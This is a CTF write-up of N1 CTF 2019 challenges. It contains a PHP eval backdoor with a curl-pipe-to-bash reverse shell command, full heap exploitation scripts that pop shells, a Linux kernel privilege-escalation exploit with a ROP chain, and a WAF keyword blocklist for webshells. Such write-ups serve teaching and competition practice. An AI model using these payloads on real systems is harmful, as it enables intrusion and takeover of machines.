# N1 CTF 2019

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190906-n1ctf/) of this writeup.**


 - [N1 CTF 2019](#n1-ctf-2019)
   - [Web](#web)
     - [Old Attack(step1)](#old-attackstep1)
     - [Pentest N1ctf2019.lab(step1)](#pentest-n1ctf2019labstep1)
   - [Reverse](#reverse)
     - [lost in the deep](#lost-in-the-deep)
     - [ROPVM](#ropvm)
   - [Misc](#misc)
     - [checkin](#checkin)
     - [N1EGG - A waf, a world](#n1egg---a-waf-a-world)
   - [Crypto](#crypto)
     - [Baby RSA](#baby-rsa)
     - [guess_ex](#guess_ex)
   - [Pwn](#pwn)
     - [Warmup](#warmup)
     - [line](#line)
     - [BabyPwn](#babypwn)
     - [BabyKernel](#babykernel)


## Web

### Old Attack(step1)

This is actually a warm-up crypto challenge.

After registering an account, we will be set a cookie `auth_name` which is base64 encoded.

The `auth_name` will have the following formats:

```
24*p:   fb4d379d7d90aa4b963fbf32336bca9d c521178ec906464f23f197b0025ad6fd
16*p:   fb4d379d7d90aa4b963fbf32336bca9d f50d78b0e3f3833799f7f07d0b97f707
16*k:   8309f00ce73438ee8afac0832a3d731a f50d78b0e3f3833799f7f07d0b97f707
```

Therefore, it's like a symmetric cipher in ECB mode. We can also infer that each ciphertext block has 16 bytes. This block `f50d78b0e3f3833799f7f07d0b97f707` is a 0-byte padding.

Our objective is to login as admin. Thus we create a user named `p * 16 + admin`, and just truncate the first block. The plaintext of the second block will be `admin`.

```python
#!/usr/bin/env python3
import requests
import re
import secrets
from urllib.parse import unquote
from base64 import b64decode

s = requests.session()
s.get('http://150.109.197.222/')
r = s.get('http://150.109.197.222/register')
token = re.findall('input type="hidden" name="_token" value="(.*)">', r.text)[0]

name = 'p' * 16 + 'admin'

data = {
     '_token': token,
     'name': name,
     'email': secrets.token_urlsafe(32) + '@example.com',
     'password': 'ap0zcj2nfao',
     'password_confirmation': 'ap0zcj2nfao'
}
print('posting')
r = s.post('http://150.109.197.222/register', data=data)
assert './userpage/' in r.text
auth = b64decode(unquote(r.cookies.get('auth_name')))
print(auth.hex())
print(len(auth))
```

The flag is `N1CTF{Cbc_is_easy_Notsaf3_s0_Old}`.

### Pentest N1ctf2019.lab(step1)

This is a penetration testing challenge. We also need privilege escalation to read `/root/flag`.

Let us use nmap to perform a port scan first. The server has FTP(21),SSH(22),HTTP(80) opened. The most suspicous is FTP. We quickly login as `anonymous` and run `ls` to list files. The FTP root directory is the same as the web root.

There is a backdoor file named `mmmmm.php`. The parameter `enjoy~` will be evaluated. It's trivial to get RCE:

```php
Welcome to N1ctf2019.lab!

<?=eval($_REQUEST["enjoy~"]);?>
```

```python
import requests
r= requests.get('http://47.52.129.242/mmmmm.php',params={'enjoy~': "system('curl 240.240.240.240:1234|bash');"})
```

We'll probably interact with tty, so run this first: 

```
# https://evertpot.com/189/
python3 -c "import pty; pty.spawn('/bin/bash')"
```

Next, gathering the system info from `/etc/os-release` and `uname --all`. This is a pretty outdated Ubuntu:

```
Linux web.n1ctf2019.lab 4.4.0-93-generic #116~14.04.1-Ubuntu SMP Mon Aug 14 16:07:05 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux


NAME="Ubuntu"
VERSION="14.04.5 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.5 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
```

One of the hint is `Hint for Pentest N1ctf2019.lab step1(Web):https://wiki.archlinux.org/index.php/Snap`. Thus we quickly found this privilege escalation exploit [dirty_sock(CVE-2019-7304)](https://github.com/initstring/dirty_sock). However, the `snapd` on the server is `snapd 2.40` which is not vulnerable. We've also tried other privilege escalation exploits but they didn't work.

Then, after reading `/etc/passwd` we found there is a user name `dirty_sock`. Both `su dirty_sock` or `ssh dirty_sock@server`  with password `dirty_sock` leads to successful login. Than we found this user is in sudoers. With the password we can easily get root via `sudo su`. 

`sudo cat /root/flag.txt`: `N1CTF{ImpOrtant_P0int3_4de0e}`


## Reverse

### lost in the deep

It should be easy to find out that this challenge is golange reverse challenge.

We are given a PE32+ binary and it's stripped. Our first priority is relabeling the function in the binary.

I try to use [golang_loader_assist.py](https://github.com/spigwitmer/golang_loader_assist/blob/master/golang_loader_assist.py). But somehow it didn't work.

The reason is that there is no segment called ` .gopclntab`.  So we should fix this.
```python
def get_gopclntab_seg():
    #   .gopclntab found in PE & ELF binaries, __gopclntab found in macho binaries
    return _get_seg(['.gopclntab', '__gopclntab'])
```

Once we relabeled the functions, we can find two suspicious functions: `main_check` and `main_dec`

`main_dec` decodes your input. It's a base64 decoder with a customized table `y17nEl9DBfHIvb42qs+xG5NKcO/6moMzYtSeApg8LZFC3TkUu0JihWRrwdQaXVPj`

`main_check` is like a variation of knapsack problem. you need maxmize the value while the weight limit is `0xe9`. But at the being we can only take [0]. After [0] is taken. it unlock [1], [2], [3], [4]. So the rule is that we need to unlock the options before we take them.



```
        value, weight, unlock options
 [0]  , 0x52 , 0x6 : [1]  [2]  [3]  [4] 
 [1]  , 0x2e , 0x1f: [5]  [6]  [7] 
 [2]  , 0x35 , 0x28:
 [3]  , 0xf  , 0xa : [8]  [9]  [a]  [b]  [c] 
 [4]  , 0x2  , 0x12: [d]  [e] 
 [5]  , 0x33 , 0x16: [f]  [g] 
 [6]  , 0x36 , 0x16:
 [7]  , 0xe  , 0x10: [h]  [i]  [j]  [k] 
 [8]  , 0x1  , 0x24: [l]  [m]  [n] 
 [9]  , 0x2b , 0x11:
 [a]  , 0x56 , 0x6 : [o]  [p]  [q] 
 [b]  , 0x2e , 0x8 : [r]  [s]  [t] 
 [c]  , 0x2f , 0x22:
 [d]  , 0x63 , 0x11:
 [e]  , 0x4b , 0x32:
 [f]  , 0x36 , 0x29: [u] 
 [g]  , 0x6  , 0x2 : [v]  [w]  [x]  [y]  [z] 
 [h]  , 0x1e , 0x22: [A] 
 [i]  , 0x38 , 0x21: [B] 
 [j]  , 0x4f , 0xb :
 [k]  , 0x2c , 0x17: [C] 
 [l]  , 0x1a , 0x2b: [D]  [E]  [F] 
 [m]  , 0x19 , 0x1 : [G]  [H] 
 [n]  , 0x52 , 0x30: [I] 
 [o]  , 0x4  , 0x2 :
 [p]  , 0x10 , 0x3 :
 [q]  , 0x5c , 0xf : [J] 
 [r]  , 0x52 , 0x20: [K]  [L]  [M] 
 [s]  , 0x36 , 0x8 : [N] 
 [t]  , 0x47 , 0x30:
 [u]  , 0x62 , 0x2c:
 [v]  , 0x47 , 0x2 : [O]  [P] 
 [w]  , 0x31 , 0x8 : [Q]  [R]  [S]  [T] 
 [x]  , 0x13 , 0x1d:
 [y]  , 0xf  , 0x1d:
 [z]  , 0x3d , 0x32: [U]  [V]  [W]  [X] 
 [A]  , 0x64 , 0x5 :
 [B]  , 0x41 , 0x16:
 [C]  , 0xd  , 0x14: [Y]  [Z] 
 [D]  , 0xe  , 0x1b: [!] 
 [E]  , 0x48 , 0x1c: ["] 
 [F]  , 0x2e , 0x2d: [#] 
 [G]  , 0x47 , 0xd :
 [H]  , 0x3b , 0x27: [$] 
 [I]  , 0x54 , 0x11: [%] 
 [J]  , 0x1a , 0x4 : [&] 
 [K]  , 0xb  , 0x22:
 [L]  , 0x13 , 0x11: ['] 
 [M]  , 0x4a , 0x28: [(] 
 [N]  , 0x24 , 0xb :
 [O]  , 0x4f , 0x20:
 [P]  , 0x2d , 0x32: [)] 
 [Q]  , 0x51 , 0x15:
 [R]  , 0x7  , 0x11: [*] 
 [S]  , 0x36 , 0x1c:
 [T]  , 0x3b , 0x1c: [+]  [,] 
 [U]  , 0x63 , 0x6 : [-]  [.]  [/] 
 [V]  , 0x4  , 0x1a:
 [W]  , 0x10 , 0x19: [:]  [;] 
 [X]  , 0x23 , 0x3 :
 [Y]  , 0x28 , 0x24: [<] 
 [Z]  , 0x23 , 0x13:
 [!]  , 0x13 , 0xd :
 ["]  , 0x55 , 0x22: [=] 
 [#]  , 0x12 , 0x4 :
 [$]  , 0x1f , 0x2b:
 [%]  , 0x8  , 0x2b: [>] 
 [&]  , 0x1d , 0x16:
 [']  , 0x14 , 0x15:
 [(]  , 0xc  , 0x7 : [?]  [@] 
 [)]  , 0x49 , 0x29: [[] 
 [*]  , 0x9  , 0x22: [\] 
 [+]  , 0x64 , 0x24:
 [,]  , 0x56 , 0x27: []] 
 [-]  , 0x18 , 0x29: [^] 
 [.]  , 0x18 , 0x1b: [_]  [`]  [{] 
 [/]  , 0x13 , 0x10: [|] 
 [:]  , 0x54 , 0x1c: [}] 
 [;]  , 0xa  , 0x14:
 [<]  , 0x63 , 0x25:
 [=]  , 0x61 , 0x8 :
 [>]  , 0x31 , 0x25: [~] 
 [?]  , 0x16 , 0xa :
 [@]  , 0x5d , 0x2e:
 [[]  , 0x63 , 0x5 :
 [\]  , 0x2d , 0x2c:
 []]  , 0x56 , 0x3 :
 [^]  , 0x40 , 0x18:
 [_]  , 0x5b , 0xb :
 [`]  , 0x56 , 0xc : [ ] 
 [{]  , 0x42 , 0x19: [    ] 
 [|]  , 0x3b , 0xf : [
]  [] 
 [}]  , 0x13 , 0x2a:
 [~]  , 0xb  , 0x87: [\x0b]  [\x0c] 
 [ ]  , 0x46 , 0x21:
 [    ]  , 0x3a , 0x22:
 [
]  , 0x25 , 0xe :
 []  , 0x52 , 0x1 :
 [\x0b]  , 0x18e , 0x44:
 [\x0c]  , 0x1e0 , 0x37:

```

For the first flag, the value should be `0x219`. And the seccond flag needs value reach `0x41a` 

I didn't figure out a good algorithm for this variation of knapsack problem. I manually find out the sequence that can reach `0x41a` is  `0135abgpqsvwzQUX/|\x0d`

And the flags for this challenge are `N1CTF{r3V3r53_G0_3X3_w17h0u7_5YmB01}` and `N1CTF{C41cu1473_17_0r_Ju57_R4c3_17}`


### ROPVM
Reverse and find it is XTEA
```c=
#include <stdint.h>
void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {
    unsigned int i;
    uint32_t v0=v[0], v1=v[1], delta=0x5f3759df, sum=delta*num_rounds;
    for (i=0; i < num_rounds; i++) {
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]);
        sum -= delta;
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
    }
    v[0]=v0; v[1]=v1;
}
int main(){
        uint64_t v[5] = {0x146d16a886dab2be,0x54f1658f3c9edb52,0x2a33699d19c12643,0xc1ce322600cd9e6b,0};
        uint32_t k[4]={0x67343146,0x34313146,0x31314667,0x67343131};

        for(int i=0;i<4;i++) decipher(0x20,&v[i],k);
        puts(v); // N1CTF{1s__R0P__Tur1n9_c0mpl3t3?}
}
```
## Misc

### checkin

![](https://i.imgur.com/9ZiyOxD.png)


### N1EGG - A waf, a world

```php
<?php

$case = file_get_contents('php://input');
if(strpos($case,'eval(')!==false){
    die('webshell');
} else if(strpos($case, 'system(') !== false) {
    die('webshell');
} else if(strpos($case, 'assert(') !== false) {
    die('webshell');
} else if(strpos($case, 'shell_exec(') !== false) {
    die('webshell');
} else if(strpos($case, 'passthru(') !== false) {
    die('webshell');
} else if(strpos($case, '{${') !== false) {
    die('webshell');
} else if(strpos($case, 'extract(') !== false) {
    die('webshell');
} else if(strpos($case, 'base64_decode(') !== false) {
    die('webshell');
} else if(strpos($case, 'gzuncompress(') !== false) {
    die('webshell');
} else if(strpos($case, 'array_map(') !== false) {
    die('webshell');
} else if(strpos($case, '¾¬¬º­«') !== false) {
    die('webshell');
} else if(strpos($case, 'include($') !== false) {
    die('webshell');
} else if(strpos($case, '`$_POST') !== false) {
    die('webshell');
} else if(strpos($case, '`$_REQUEST') !== false) {
    die('webshell');
} else if(strpos($case, 'preg_replace(') !== false) {
    die('webshell');
} else if(strpos($case, '"."') !== false) {
    die('webshell');
} else if(strpos($case, '"^"') !== false) {
    die('webshell');
} else if(strpos($case, 'shell') !== false) {
    die('webshell');
} else if(strpos($case, ')($') !== false) {
    die('webshell');
} else if(strpos($case, 'mail(') !== false) {
    die('webshell');
} else if(stripos($case, 'ld(') !== false) {
    die('webshell');
} else if(stripos($case, 'link(') !== false) {
    die('webshell');
} else{
    die('no-webshell');
}
```

Final Score: 142

## Crypto

### Baby RSA

Each encrypted number $x$ equal to $(2y+0)^e\ (mod\ N)$ or $(2y+1)^e\ (mod\ N)$, where $y \equiv randint()^2\ (mod\ N)$. Thus, if $2^{-e}x\ (mod\ N)$ is a quadratic residue of $N$, then the original bit is 0; otherwise ,it is 1. Since N is not an odd prime, so the original Euler's criterion $(a|p)\ =\  a^{\frac{p-1}{2}}(mod\ p)$ cannot be used in this problem. The properties of Jacobi symbol, which is the generalization of Legendre symbol, and law of quadratic reciprocity would help to solve this problem.

```python=
f = open('./flag.enc','r')
l = []
for line in f:
    l.append(int(line[:-2], 16))

def jacobi(a, n):
    assert(n > a > 0 and n%2 == 1)
    t = 1
    while a != 0:
        while a % 2 == 0:
            a //= 2
            r = n % 8
            if r == 3 or r == 5:
                t = -t
        a, n = n, a
        if a % 4 == n % 4 == 3:
            t = -t
        a %= n
    if n == 1:
        return t
    else:
        return 0
rev2 = modinv(pow(2, e, N), N)

ans = ""
for i in l:
    if jacobi((i * rev2)%N, N) == 1:
        ans += "0"
    else:
        ans += "1"
        
number.long_to_bytes(int(ans[::-1], 2))
```

### guess_ex
The problem is a modular linear equation where all numbers are mixed with some small error before sending to us:
$$
\begin{aligned}
a' &= a + e_a \\
T' &= T + e_T \\
S  &= U + e_S \\
a \in Z_p \quad T &\in Z_p^d \quad U = a \times T \\
\end{aligned}
$$

And we can derive following equation:
$$
\begin{aligned}
a' \times T' - S &= (a + e_a) (T + e_T) - (aT + e_S) \\
                  &= a' e_T + T' e_a - (e_a e_T + e_S)\\
\end{aligned}
$$

Now we have a system of linear equations on those error terms. Since those error terms are quite short, we can build a lattice and use LLL to solve the SIS problem:
```python
"""
expected ans:  ea  (et ^ d)  (eats ^ d)  (mod ^ d)  -1
matrix coeff:  T'   a'        1           p         y
"""
M = []
for i, (ti, si) in enumerate(zip(T, S)):
    lpad = [0] * i
    rpad = [0] * (d - i - 1)
    yi = (A * ti - si) % P
    row = [ti] + lpad + [A] + rpad + lpad + [1] + rpad + lpad + [P] + rpad + [yi]
    M.append(row)

M = Matrix(M)
k = M.right_kernel_matrix()
k = k.LLL()
sol = k[0]
sol = sol * sol[-1] * -1
sol = A - sol[0]
```


## Pwn


### Warmup

probability of 1/16

```python=
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '47.52.90.3'
port = 9999

binary = "./warmup"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")
q=0
def add(content):
  global q
  q+=1
  print q
  r.recvuntil(">>")
  r.sendline("1")
  r.recvuntil(">>")
  r.send(content)

def edit(index,content):
  r.recvuntil(">>")
  r.sendline("3")
  r.recvuntil(":")
  r.sendline(str(index))
  r.recvuntil(">>")
  r.send(content)

def remove(index):
  r.recvuntil(">>")
  r.sendline("2")
  r.recvuntil(":")
  r.sendline(str(index))
  pass


if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})
  #r = remote("127.0.0.1" ,4444)

else:
  r = remote(host ,port)

if __name__ == '__main__':
  add("1") # 0
  add("2") # 1
  add("3") # 2
  add("4") # 3
  remove(3)
  remove(3)
  remove(2)
  remove(2)
  remove(0)
  remove(0)
  add("\xb0") # 0
  add("\xb0") # 2
  add("A"*8 + p64(0xa1)) # 3
  for i in xrange(3):
    remove(0)
    remove(0)
    edit(2,"\xc0")
    add("A") # 0
    add("A") # 4
    remove(4)
    remove(4)
  remove(0)
  remove(0)
  edit(2,"\xc0")
  add("A") # 0
  add("A") # 4
  edit(3,"D"*8 + p64(0x51))
  remove(1)
  remove(1)
  edit(3,"D"*8 + p64(0xa1))
  remove(4)
  remove(4)
  edit(3,"D"*8 + p64(0x51) + p16(0x3760))

  add("A")
  add(p64(0xfbad3c80) + p64(0)*3 + "\x00")
  r.recv(8)
  libc = u64(r.recv(8).ljust(8,"\x00")) - 0x3ed8b0

  edit(3,"sh\x00")
  remove(0)
  remove(0)
  add(p64(libc + 0x3ed8e8))
  add(p64(libc + 0x3ed8e8))
  add(p64(libc + 0x4f440))
  remove(3)
  r.sendline("ls")

  r.interactive()

```

### line




```python=
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '35.235.107.145'
port = 6699

binary = "./line"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def add(ID,size,content):
  r.recvuntil(": ")
  r.sendline("1")
  r.recvuntil(": ")
  r.sendline(str(ID))
  r.recvuntil(": ")
  r.sendline(str(size))
  time.sleep(0.01)
  r.send(content)
  pass
def show(start,end):
  r.recvuntil(": ")
  r.sendline("2")
  pass
  r.recvuntil(start)
  data = r.recvuntil(end)[:-len(end)]
  return data

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  for i in xrange(8):
    add(i+0x10,0x20,str(i+1))
  for i in xrange(8):
    add(i+0x20,0x80,str(i+1))
  for i in xrange(8):
    add(i+0x30,0x30,str(i+1))
  add(0x40,1,"A")
  show("","")
  r.recvuntil("8 : 64 (")
  libc = u64(r.recv(6).ljust(8,"\x00")) - 0x3ebc41
  print("libc = {}".format(hex(libc)))
  for i in xrange(7):
    add(0x10+i,0x10,"A")
  for i in xrange(3):
    add(0x20+i,0x40,"A")
  add(0x30,1,"A")
  show("","")
  r.recvuntil("8 : 48 (")
  heap = u64(r.recv(6).ljust(8,"\x00")) - 0xa41
  print("heap = {}".format(hex(heap)))
  add(1,1,"A")
  add(1,1,"A")
  add(2,1,"A")
  for i in xrange(8):
    add(0x40+i,0x50,"sh\x00")
  add(8,0x10,p64(libc + 0x3ed8e8))
  add(8,0x10,"A")
  add(9,0x10,p64(libc + 0x4f440))
  r.recvuntil(": ")
  r.sendline("1")
  r.recvuntil(": ")
  r.sendline("1")
  time.sleep(0.1)
  r.sendline("ls")
  
  r.interactive()


```




### BabyPwn
probability of 1/16

```pyhton=
from pwn import *

#r = process(["./BabyPwn"])
r = remote("124.156.209.69", 9999)
def add(name,size,content):
	r.sendafter(":","1\x00")
	r.sendafter(":",name)
	r.sendafter(":",str(size)+"\x00")
	r.sendafter(":",content)

def remove(idx):
	r.sendafter(":","2\x00")
	r.sendafter(":",str(idx)+"\x00")

add("a",0x60,"a")
add("a",0x60,"a")
remove(0)
remove(1)
remove(0)
add("a",0x60,p64(0x60203d))
add("a",0x60,"a")
add("a",0x60,"a")
add("a",0x60,"a"*3+p64(0)+p64(0x51)+p64(0)+p64(0x602060)+p64(0x602058)+p64(0)*6+p64(0x21))
remove(2)


add("a",0x60,"a")
add("a",0xc0,"a")
add("a",0x60,"a")
add("a",0x60,"a")
remove(3)
#val = int(raw_input(":"),16)
val = 0xa
val = val*0x1000+0x5dd
add("a",0x60,p16(val))
remove(5)
remove(4)
remove(5)
add("a",0x48,p64(0)+p64(0x602060)+p64(0x602058)+p64(0)+p64(0)*5)
remove(2)

add("a",0x60,"\x00")
add("a",0x60,"a")
add("a",0x60,"a")
add("a",0x60,"a")

add("a",0x48,p64(0)+p64(0x602060)+p64(0x602058)+p64(0)+p64(0)*5)
remove(2)

add("a",0x60,"\x00"*0x33+p64(0xfbad1800)+"\x00"*0x19)
r.recvuntil(":")
data = r.recvuntil("=")
libc = u64(data[8*8:9*8])-0x3c5600
print hex(libc)

add("a",0x48,p64(0)+p64(0x602060)+p64(0x602058)+p64(0)+p64(0)*5)
remove(2)
add("a",0x60,"a")
add("a",0x60,"a")

remove(3)
remove(4)
remove(3)
add("a",0x60,p64(libc+0x3c4aed))

add("a",0x48,p64(0)+p64(0x602060)+p64(0x602058)+p64(0)+p64(0)*5)
remove(2)
add("a",0x60,"a")
add("a",0x60,"a")
add("a",0x60,"a"*0x13+p64(libc+0xf02a4))
remove(0)
remove(0)


r.interactive()

```


### BabyKernel

```c=
#define _GNU_SOURCE
#include <sys/types.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <poll.h>
#include <stdint.h>

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
					   } while (0)
#define __u64 uint64_t
#define __u32 uint32_t
#define __u16 uint16_t
#define __u8  uint8_t
#define __s64 int64_t

#define UFFDIO_API 0xc018aa3f
#define UFFDIO_REGISTER 0xc020aa00
#define UFFDIO_COPY 0xc028aa03

#define UFFD_API ((__u64)0xAA)	  
#define __NR_userfaultfd 323 
struct uffdio_range {
	__u64 start;
	__u64 len;
};
struct uffdio_copy {
	__u64 dst;
	__u64 src;
	__u64 len;
	
#define UFFDIO_COPY_MODE_DONTWAKE		((__u64)1<<0)
	__u64 mode;
	__s64 copy;
};

struct uffd_msg {
	__u8	event;

	__u8	reserved1;
	__u16	reserved2;
	__u32	reserved3;

	union {
		struct {
			__u64	flags;
			__u64	address;
			union {
				__u32 ptid;
			} feat;
		} pagefault;

		struct {
			__u32	ufd;
		} fork;

		struct {
			__u64	from;
			__u64	to;
			__u64	len;
		} remap;

		struct {
			__u64	start;
			__u64	end;
		} remove;

		struct {
			/* unused reserved fields */
			__u64	reserved1;
			__u64	reserved2;
			__u64	reserved3;
		} reserved;
	} arg;
} __packed;



struct uffdio_api {
	__u64 api;
	 
#define UFFD_FEATURE_PAGEFAULT_FLAG_WP		(1<<0)
#define UFFD_FEATURE_EVENT_FORK			(1<<1)
#define UFFD_FEATURE_EVENT_REMAP		(1<<2)
#define UFFD_FEATURE_EVENT_REMOVE		(1<<3)
#define UFFD_FEATURE_MISSING_HUGETLBFS		(1<<4)
#define UFFD_FEATURE_MISSING_SHMEM		(1<<5)
#define UFFD_FEATURE_EVENT_UNMAP		(1<<6)
#define UFFD_FEATURE_SIGBUS			(1<<7)
#define UFFD_FEATURE_THREAD_ID			(1<<8)
	__u64 features;

	__u64 ioctls;
};
						   
struct uffdio_register {
	struct uffdio_range range;
#define UFFDIO_REGISTER_MODE_MISSING	((__u64)1<<0)
#define UFFDIO_REGISTER_MODE_WP		((__u64)1<<1)
	__u64 mode;
	__u64 ioctls;
};	   
				
void get_NULL(){
	void *map = mmap((void*)0x10000, 0x1000, PROT_READ|PROT_WRITE,
                   MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, -1, 0);
	int fd = open("/proc/self/mem", O_RDWR);
  	unsigned long addr = (unsigned long)map;
  	while (addr != 0) {
	    addr -= 0x1000;
	    lseek(fd, addr, SEEK_SET);
    	    char cmd[1000];
	    sprintf(cmd, "LD_DEBUG=help su --help 2>&%d", fd);
    	    system(cmd);
  	}
	close(fd);
	printf("data at NULL: 0x%lx\n", *(unsigned long *)0);
}
static int page_size;
char *fault;
int pfd[0x1000];
int tmp;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );

}

void get_shell(int sig){
	system("sh");
}
void* job(void* x){
	sleep(1);
	fault = (void*)mmap((void*)0x2468000,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,-1,0);
}

static void *
fault_handler_thread(void *arg)
{
   
   static int fault_cnt = 0;     /* Number of faults so far handled */
   long uffd;                    /* userfaultfd file descriptor */
   static char *page = NULL;
   ssize_t nread;
   struct uffdio_copy uffdio_copy;
   static struct uffd_msg msg;
   uffd = (long) arg;

   /* Create a page that will be copied into the faulting region */

   if (page == NULL) {
	   page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
				   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	   if (page == MAP_FAILED)
		   errExit("mmap");
   }

   /* Loop, handling incoming events on the userfaultfd
	  file descriptor */

   for (;;) {

	   /* See what poll() tells us about the userfaultfd */

	   struct pollfd pollfd;
	   int nready;
	   pollfd.fd = uffd;
	   pollfd.events = POLLIN;
	   nready = poll(&pollfd, 1, -1);
	   if (nready == -1)
		   errExit("poll");
	   munmap(fault,0x1000);
	   /* Read an event from the userfaultfd */
	   read(uffd,&msg,sizeof(msg));
	   uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                                  ~(page_size - 1);
 	   uffdio_copy.len = page_size;
           uffdio_copy.mode = 0;
           uffdio_copy.copy = 0;
           if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                errExit("ioctl-UFFDIO_COPY");   



   }
}

int main(int argc, char *argv[])
{
   long uffd;          /* userfaultfd file descriptor */
   char *addr;         /* Start of region handled by userfaultfd */
   unsigned long len;  /* Length of region handled by userfaultfd */
   pthread_t thr;      /* ID of thread that handles page faults */
   struct uffdio_api uffdio_api;
   struct uffdio_register uffdio_register;
   int s;

   page_size = sysconf(_SC_PAGE_SIZE);
   len =  page_size;

   /* Create and enable userfaultfd object */

   uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
   if (uffd == -1)
	   errExit("userfaultfd");

   uffdio_api.api = UFFD_API;
   uffdio_api.features = 0;
   if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
	   errExit("ioctl-UFFDIO_API");

   /* Create a private anonymous mapping. The memory will be
	  demand-zero paged--that is, not yet allocated. When we
	  actually touch the memory, it will be allocated via
	  the userfaultfd. */

   addr = mmap(NULL, len, PROT_READ | PROT_WRITE,
			   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
   if (addr == MAP_FAILED)
	   errExit("mmap");



   /* Register the memory range of the mapping we just created for
	  handling by the userfaultfd object. In mode, we request to track
	  missing pages (i.e., pages that have not yet been faulted in). */

   uffdio_register.range.start = (unsigned long) addr;
   uffdio_register.range.len = len;
   uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
   if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
	   errExit("ioctl-UFFDIO_REGISTER");

   /* Create a thread that will process the userfaultfd events */

   s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
   if (s != 0) {
	   errno = s;
	   errExit("pthread_create");
   }
   save_status();
   get_NULL();
   signal(SIGSEGV,get_shell);
   int fd = open("/dev/pwn",O_RDONLY);
   uint64_t buf[0x22];
   char *addr2 = (void*)mmap((void*)0x1234000,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,-1,0);
   fault = (void*)mmap((void*)0x2468000,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,-1,0);
   size_t kcode = 0;

	memset(addr2,0,0x1000);
	buf[0] = 1;
	buf[1] = (size_t)addr2;
	buf[2] = 0x400;
	ioctl(fd,111,buf);
	for(int i=0;i<0x1000;i++)
		pfd[i] = open("/dev/ptmx/",O_RDWR);
	buf[0x21] = 0;
	buf[0] = 4;
	buf[1] = (size_t)addr2;
	buf[2] = 0x300;
	buf[3] = (size_t)fault;
	buf[4] = 0x80;
	buf[5] = (size_t)addr;
	buf[6] = 0x80;
	buf[7] = (size_t)addr2;
	buf[8] = 0x300;	
	pthread_t tid;
	pthread_create(&tid,NULL,job,NULL);
	ioctl(fd,222,buf);
	pthread_join(tid,NULL);
	size_t *p = (size_t*)addr2;
	kcode = p[7];
	buf[0] = 0;
	if( kcode < 0xff00000000000000 ){
		puts("Leak Failed");	
		ioctl(fd,444,buf);
		exit(-1);
	}
    kcode -= 0x17b08c0;
    printf("%p\n",(void*)kcode);
    ioctl(fd,444,buf);
	kcode -= 0xffffffff81000000;
        size_t *rop = (size_t*)&addr2[0x10];
	int i=0;


	rop[i++] = kcode + 0xffffffff81086800; // : pop rdi ; ret;
	rop[i++] = 0;
	rop[i++] = kcode + 0xffffffff810b9db0;
	rop[i++] = kcode + 0xffffffff8151224c; //: push rax ; pop rdi ; add byte ptr [rax], al ; pop rbp ; ret
	rop[i++] = 0;
	rop[i++] = kcode + 0xffffffff810b9a00;
       

        rop[i++] = kcode + 0xffffffff81070894; // swapgs ; pop rbp ; ret
        rop[i++] = 0;
        rop[i++] = kcode+0xffffffff81036bfb; // iretq
        rop[i++] = (size_t)get_shell;
        rop[i++] = user_cs;                /* saved CS */
        rop[i++] = user_rflags;            /* saved EFLAGS */
        rop[i++] = user_sp;
        rop[i++] = user_ss;

	rop[i++] = kcode + 0xffffffff8100021e;
	buf[0] = 1;
	buf[1] = (size_t)addr2;
	buf[2] = 0x400;
	ioctl(fd,111,buf);
	buf[0x21] = 0;
	*(size_t*)0 = kcode+0xffffffff81488731;
	buf[0x21] = 0;
	buf[1] = (size_t)addr2+0xff8;
	buf[2] = 0x10;
	ioctl(fd,333,buf);
	ioctl(fd,333,buf);


   
}

```

















